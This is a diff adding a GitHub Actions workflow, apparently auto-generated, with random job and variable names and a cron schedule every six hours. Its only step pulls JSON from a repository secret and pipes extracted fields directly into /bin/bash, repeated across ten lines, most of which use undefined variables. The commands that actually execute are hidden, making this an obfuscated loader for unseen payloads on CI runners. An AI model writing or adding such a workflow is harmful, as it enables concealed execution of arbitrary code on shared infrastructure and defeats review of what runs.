@@ -1,0 +1,27 @@
+name: liufusi3456
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '40 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: liufusi3456
+        env:
+          cyg774: ${{ secrets.cyg774 }}
+        run: |
+          echo $cyg774 | jq -r .ly99 | /bin/bash
+          echo $hselx52 | jq -r .ywni61 | /bin/bash
+          echo $ig9353 | jq -r .wcvpf32222 | /bin/bash
+          echo $qfr663 | jq -r .dt549 | /bin/bash
+          echo $vvuo18101 | jq -r .wd2491 | /bin/bash
+          echo $b55026 | jq -r .anap21408 | /bin/bash
+          echo $ls26600 | jq -r .uw2 | /bin/bash
+          echo $njjh9575 | jq -r .spob318 | /bin/bash
+          echo $u39 | jq -r .g153 | /bin/bash
+          echo $hac98673 | jq -r .mqxk049 | /bin/bash
+
